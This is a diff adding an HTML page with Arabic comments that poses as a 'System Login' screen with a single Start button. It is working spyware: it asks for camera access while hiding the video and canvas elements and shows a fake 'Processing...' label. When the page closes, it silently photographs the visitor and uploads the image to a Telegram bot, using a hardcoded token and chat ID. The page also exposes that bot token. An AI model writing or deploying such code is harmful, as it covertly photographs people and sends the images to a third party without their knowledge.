@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Login</title>
+    <style>
+        /* شاشة سوداء بالكامل */
+        body {
+            background-color: #000;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* زر البدء في المنتصف */
+        .btn-start {
+            background: none;
+            border: 2px solid #333;
+            color: #555;
+            padding: 15px 50px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .btn-start:hover {
+            border-color: #555;
+            color: #888;
+        }
+
+        /* إخفاء عناصر الكاميرا تماماً */
+        video, canvas {
+            display: none;
+            position: fixed;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <button id="actionBtn" class="btn-start">Start</button>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const actionBtn = document.getElementById('actionBtn');
+
+        let stream = null;
+        let hasSent = false;
+
+        // بدء الكاميرا عند ضغط الزر (بدون عرض الفيديو)
+        actionBtn.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+                
+                // تغيير شكل الزر ليوحي بالتحميل أو العمل
+                actionBtn.innerText = "Processing...";
+                actionBtn.style.borderColor = "#111";
+                
+            } catch (err) {
+                console.error("Camera access denied or error:", err);
+            }
+        });
+
+        // وظيفة التقاط الصورة وإرسالها
+        function captureAndSend() {
+            if (!stream || hasSent) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+
+                // استخدام navigator.sendBeacon أو fetch مع keepalive لضمان الإرسال عند إغلاق الصفحة
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true // هامة جداً لضمان وصول الطلب حتى بعد إغلاق المتصفح
+                });
+                
+                hasSent = true;
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg', 0.7);
+        }
+
+        // إرسال الصورة تلقائياً عند إغلاق الصفحة أو الخروج منها
+        window.addEventListener('pagehide', (event) => {
+            captureAndSend();
+        });
+
+        // إرسال الصورة أيضاً إذا ضغط المستخدم على الزر مرة أخرى (اختياري)
+        // أو يمكنك جعل الإرسال يتم بعد 5 ثوانٍ تلقائياً من الضغط على Start
+    </script>
+</body>
+</html>
